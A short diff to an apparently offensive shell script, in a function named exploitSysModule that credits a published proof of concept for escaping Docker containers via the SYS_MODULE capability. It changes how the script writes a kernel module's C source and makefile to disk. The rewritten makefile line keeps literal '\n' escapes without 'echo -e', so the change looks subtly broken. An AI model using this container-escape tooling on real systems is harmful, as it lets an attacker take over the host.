@@ -1163,7 +1163,7 @@ exploitSysModule(){
   printQuestion "Writing scripts..."
 
   # POC modified from https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
-  C_SRC=$(cat << EOF
+cat << EOF > $module_name.c
 #include <linux/kmod.h>
 #include <linux/module.h>
 MODULE_LICENSE("GPL");
@@ -1180,16 +1180,10 @@ static void __exit ${module_name}_exit(void) {
 module_init(${module_name}_init);
 module_exit(${module_name}_exit);
 EOF
-  )
 
-  echo "$C_SRC" > "$module_name.c"
-
-  MAKEFILE=$(cat << EOF
+cat << EOF > makefile
   obj-m +=${module_name}.o\nall:\n\tmake -C /lib/modules/$(uname -r)/build M=$(pwd) modules\nclean:\n\tmake -C /lib/modules/$(uname -r)/build M=$(pwd) clean
 EOF
-  )
-
-  echo -e "$MAKEFILE" > Makefile
 
   printSuccess "Done"
 
